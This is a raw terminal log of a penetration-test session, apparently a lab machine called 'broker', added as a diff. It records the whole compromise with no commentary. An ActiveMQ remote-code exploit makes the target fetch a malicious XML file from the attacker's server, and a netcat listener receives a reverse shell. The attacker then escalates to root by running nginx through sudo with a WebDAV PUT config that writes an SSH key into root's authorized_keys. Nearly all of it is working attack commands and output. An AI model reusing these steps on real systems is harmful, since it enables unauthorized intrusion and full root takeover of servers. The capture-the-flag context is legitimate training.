@@ -1,0 +1,153 @@
+
+
+default creds
+admin:admin
+
+┌──(root㉿kali)-[/home/kali]
+└─# nano exploit_46604.py    
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano poc.xml         
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano exploit_46604.py
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python3 exploit_46604.py -i 10.10.11.243 -p 61616 -u http://10.10.14.16:8000/poc.xml
+     _        _   _           __  __  ___        ____   ____ _____ 
+    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
+   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
+  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
+ /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|
+
+[*] Target: 10.10.11.243:61616
+[*] XML URL: http://10.10.14.16:8000/poc.xml
+
+[*] Sending packet: 000000721f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001f687474703a2f2f31302e31302e31342e31363a383030302f706f632e786d6c
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+┌──(root㉿kali)-[/home/kali]
+└─# python3 -m http.server   
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.243 - - [22/Aug/2025 21:41:30] "GET /poc.xml HTTP/1.1" 200 -
+10.10.11.243 - - [22/Aug/2025 21:41:30] "GET /poc.xml HTTP/1.1" 200 -
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001            
+listening on [any] 9001 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.243] 34488
+bash: cannot set terminal process group (885): Inappropriate ioctl for device
+bash: no job control in this shell
+activemq@broker:/opt/apache-activemq-5.15.15/bin$ id
+id
+uid=1000(activemq) gid=1000(activemq) groups=1000(activemq)
+activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
+
+activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
+sudo -l
+Matching Defaults entries for activemq on broker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User activemq may run the following commands on broker:
+    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
+activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
+
+
+activemq@broker:/tmp$ cat > /tmp/pwn.conf <<'EOF'
+> user root;
+> worker_processes 4;
+> pid /tmp/nginx.pid;
+> events { worker_connections 768; }
+> http {
+>  server {
+>   listen 1337;
+>   root /;
+>   autoindex on;
+>   dav_methods PUT;
+>  }
+> }
+> EOF
+activemq@broker:/tmp$ sudo /usr/sbin/nginx -c /tmp/pwn.conf
+activemq@broker:/tmp$ 
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh-keygen -t rsa -b 3072 -f /tmp/root_k -N ''
+cat /tmp/root_k.pub
+Generating public/private rsa key pair.
+Your identification has been saved in /tmp/root_k
+Your public key has been saved in /tmp/root_k.pub
+The key fingerprint is:
+SHA256:lVpqlsxbTQSxNr3PaSVySaD0q7FTtYolVJ2yLMtF9HE root@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|          ++=...E|
+|         . Ooooo |
+|          Xo+o+  |
+|       o O.++= o |
+|        S.++B = .|
+|       o ooO * + |
+|        . = . =  |
+|           . .   |
+|                 |
++----[SHA256]-----+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdJ/L1YlIU2Hg1pzCVMkm85jn1OLFACdDRNBv1KdRVapc+j5S7rlInPDmNkw4b1PD4n90YATR+tiPBOCRJMgjtRiRpP1V2os5a8nMeUgrfyFRnkkBL71Q29F2l+vpsLT/kKYm5DwUkCWegKEPbzuA8uARnUujhYlj3Fd8kI9CT5thu6DR8sMr8qpvh7T44PmaUA38k8WRFciksmm2aWCT4f7mdMSSIeDfQmYlQToR2AQLkV4JetrqxEXRa3tY/8CIbOa3mffb5uwXKOQNrtlpopajIedqXbjlLEge9rLJ/W60aQbgncdxpcKAH+r6Iq9Pcqizxtk1VqTPeEJ2SGnOZUb266GTveSeLycfAepBh8QNRmP/ss1t7EzrLs9RjHzY6qHBVXrHcKjAQeht01Ia6ORk/M5HcAqLcy9UNPiPTrn2pweWaCN2ySZzLWu4tkfz0C6WVCPTLWpSs/I1zz1jUnxaEGjVIUi4ZdxsRQ5qQggMWAPOKdLMJQyVUskUYFQc= root@kali
+                                                                                               
+
+activemq@broker:/tmp$ curl -X PUT localhost:1337/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdJ/L1YlIU2Hg1pzCVMkm85jn1OLFACdDRNBv1KdRVapc+j5S7rlInPDmNkw4b1PD4n90YATR+tiPBOCRJMgjtRiRpP1V2os5a8nMeUgrfyFRnkkBL71Q29F2l+vpsLT/kKYm5DwUkCWegKEPbzuA8uARnUujhYlj3Fd8kI9CT5thu6DR8sMr8qpvh7T44PmaUA38k8WRFciksmm2aWCT4f7mdMSSIeDfQmYlQToR2AQLkV4JetrqxEXRa3tY/8CIbOa3mffb5uwXKOQNrtlpopajIedqXbjlLEge9rLJ/W60aQbgncdxpcKAH+r6Iq9Pcqizxtk1VqTPeEJ2SGnOZUb266GTveSeLycfAepBh8QNRmP/ss1t7EzrLs9RjHzY6qHBVXrHcKjAQeht01Ia6ORk/M5HcAqLcy9UNPiPTrn2pweWaCN2ySZzLWu4tkfz0C6WVCPTLWpSs/I1zz1jUnxaEGjVIUi4ZdxsRQ5qQggMWAPOKdLMJQyVUskUYFQc= root@kali'
+activemq@broker:/tmp$ 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i /tmp/root_k root@10.10.11.243          
+The authenticity of host '10.10.11.243 (10.10.11.243)' can't be established.
+ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:3: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.243' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Aug 23 01:58:08 AM UTC 2025
+
+  System load:           0.01220703125
+  Usage of /:            72.0% of 4.63GB
+  Memory usage:          13%
+  Swap usage:            0%
+  Processes:             163
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.243
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:4934
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+root@broker:~# 
+
+
+
+
+
+
+
+
+
+
+
+
